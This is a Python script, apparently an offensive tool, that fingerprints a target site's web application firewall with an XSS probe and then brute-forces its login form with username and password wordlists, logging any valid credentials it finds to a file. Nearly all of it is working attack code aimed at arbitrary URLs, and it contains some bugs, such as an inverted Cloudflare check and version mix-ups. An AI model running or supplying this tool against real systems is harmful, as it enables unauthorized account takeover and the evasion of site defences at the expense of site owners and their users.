#!/usr/bin/env python2
import requests
import mechanize
import itertools
import http.cookiejar
import sys
from bs4 import BeautifulSoup
from re import search, findall
from urllib.request import urlopen
from urllib.request import Request, urlopen
from urllib.error import URLError
#Stuff related to Mechanize browser module
br = mechanize.Browser() #Shortening the call by assigning it to a varaible "br"
# set cookies
cookies = http.cookiejar.LWPCookieJar()
br.set_cookiejar(cookies)
# Mechanize settings
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_debug_http(False)
br.set_debug_responses(False)
br.set_debug_redirects(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
headers = {'User-Agent': 'Mozilla/5.0'}

url = sys.argv[1]
if 'http://' in url:
    pass
elif 'https://' in url:
    url = url.replace('https://', 'http://')
else:
    url = 'http://' + url
try:
    br.open(url, timeout=10.0) #Opens the url
except URLError as e:
    url = 'https://' + url
    br.open(url)
forms = br.forms() #Finds all the forms present in webpage

#headers = str(urlopen(url).headers.headers).lower()
request = Request(url, headers=headers)
z = str(urlopen(request)).lower()

if 'x-frame-options:' not in z:
    print('\033[1;32m[+]\033[0m Heuristic found a Clickjacking Vulnerability')
if 'cloudflare-nginx' not in z:
    print('\033[1;31m[-]\033[0m Target is protected by Cloudflare')
data = requests.get(url).text #Reads the response
if 'type="hidden"' not in data:
    print('\033[1;32m[+]\033[0m Heuristic found a CSRF Vulnerability')

soup =  BeautifulSoup(data, 'lxml') #Pareses the response with beuatiful soup
i_title = soup.find('title') #finds the title tag
if i_title != None:
    original = i_title.contents #value of title tag is assigned to 'original'

def WAF_detector(): #WAF detection function
    noise = "?=<script>alert()</script>" #a payload which is noisy enough to provoke the WAF
    fuzz = url + noise
    res1 = urlopen(fuzz) #Opens the noise injected payload
    if res1.code == 406 or res1.code == 501: #if the http response code is 406/501
        print("\033[1;31m[-]\033[1;m WAF Detected : Mod_Security")
    elif res1.code == 999: #if the http response code is 999
        print("\033[1;31m[-]\033[1;m WAF Detected : WebKnight")
    elif res1.code == 419: #if the http response code is 419
        print("\033[1;31m[-]\033[1;m WAF Detected : F5 BIG IP")
    elif res1.code == 403: #if the http response code is 403
        print("\033[1;31m[-]\033[1;m Unknown WAF Detected")
WAF_detector()

def wordlist_u(lst): #Loads usernames from usernames.txt
    try:
        with open('usernames.txt','r') as f:
            for line in f:
                final = str(line.replace("\n",""))
                lst.append(final)
    except IOError:
        print("\033[1;31m[-]\033[1;m Wordlist not found!")
        quit()
def wordlist_p(lst): #Loads passwords from passwords.txt
    try:
        with open('passwords.txt','r') as f:
            for line in f:
                final = str(line.replace("\n",""))
                lst.append(final)
    except IOError:
        print("\033[1;31m[-]\033[1;m Wordlist not found!")
        quit()
usernames = []
wordlist_u(usernames)
print('\033[1;97m[>]\033[1;m Usernames loaded: %i'% len(usernames))
passwords = []
wordlist_p(passwords)
print('\033[1;97m[>]\033[1;m Passwords loaded: %i'% + len(passwords))
def find(): #Function for finding forms
    form_number = 0
    for f in forms: #Finds all the forms in the webpage
        data = str(f) #Converts the response recieved to string
        username = search(r'<TextControl\([^<]*=\)>', data) #Searches for fields that accept plain text

        if username: #if such field is found
            username = (username.group().split('<TextControl(')[1][:-3]) #Extractst the name of field
            print('\033[1;33m[!]\033[0m Username field: ' + username) #prints name of field
            passwd = search(r'<PasswordControl\([^<]*=\)>', data) #Searchs for fields that accept password like text

            if passwd: #if such field is found
                passwd = (passwd.group().split('<PasswordControl(')[1][:-3]) #Extracts the field name
                print('\033[1;33m[!]\033[0m Password field: ' + passwd) #prints name of field
                select_n = search(r'SelectControl\([^<]*=', data) #checks for other selectable menus in form
 
                if select_n: #if a menu is found
                    name = (select_n.group().split('(')[1][:-1]) #Extracts the menu name
                    select_o = search(r'SelectControl\([^<]*=[^<]*\)>', data) #select_o is the name of menu

                    if select_o: #Proceeds to find options of menu
                        menu = "True" #Sets the menu to be true
                        options = (select_o.group().split('=')[1][:-1]) #Extracts options
                        print('\n\033[1;33m[!]\033[0m A drop down menu detected.')
                        print('\033[1;33m[!]\033[0m Menu name: ' + name) #prints menu name
                        print('\033[1;33m[!]\033[0m Options available: ' + options) #prints available options
                        option = input('\033[1;34m[?]\033[0m Please Select an option:>> ') #Gets option from user
                        brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                    else:
                        menu = "False" #No menu is present in the form
                        try:
                            brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                        except Exception as e:
                            cannotUseBruteForce(username, e)
                            pass							
                else:
                    menu = "False" #No menu is present in the form
                    option = "" #Sets option to null
                    name = "" #Sets name to null
                    try:
                        brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                    except Exception as e:
                       cannotUseBruteForce(username, e)
                       pass
            else:
                form_number = form_number + 1
                pass
        else:
            form_number = form_number + 1
            pass
    print('\033[1;31m[-]\033[0m No forms found')
def cannotUseBruteForce(username, e):
    print('\r\033[1;31m[!]\033[0m Cannot use brute force with user %s.' % username)
    print('\r    [Error: %s]' % e.message)	
def brute(username, passwd, menu, option, name, form_number):
    for uname in usernames:
        progress = 1
        print('\033[1;97m[>]\033[1;m Bruteforcing username: %s'% uname)
        for password in passwords:
            sys.stdout.write('\r\033[1;97m[>]\033[1;m Passwords tried: %i / %i'% (progress, len(passwords)))
            sys.stdout.flush()
            requests.get(url)  
            br.select_form(nr=form_number)
            br.form[username] = uname
            br.form[passwd] = password
            if menu == "False":
                pass
            elif menu == "True":
                br.form[name] = [option]
            else:
                pass
            resp = br.submit()
            data = resp.read()
            data_low = str(data.lower())
            if 'username or password' in data_low:
                pass
            else:
                soup =  BeautifulSoup(data, 'lxml')
                i_title = soup.find('title')
                if i_title == None:
                    data = data.lower()
                    if 'logout' in data:
                        print('\n\033[1;32m[+]\033[0m Valid credentials found: ')
                        print(uname)
                        print(password)
                        quit()
                    else:
                        pass
                else:
                    injected = i_title.contents
                    if original != injected:
                        print('\n\033[1;32m[+]\033[0m Valid credentials found: ')
                        print('\033[1;32mUsername: \033[0m' + uname)
                        print('\033[1;32mPassword: \033[0m' + password)
                        open('Vulns/sqlloginbypassfound.txt', 'a').write(url + '\n'+ 'username:'+ uname+ '\n'+ 'password:'+ password+ '\n')
                        quit()
                    else:
                        pass
            progress = progress + 1
        print('')
    print('\033[1;31m[-]\033[0m Failed to crack login credentials')
    quit()
find()
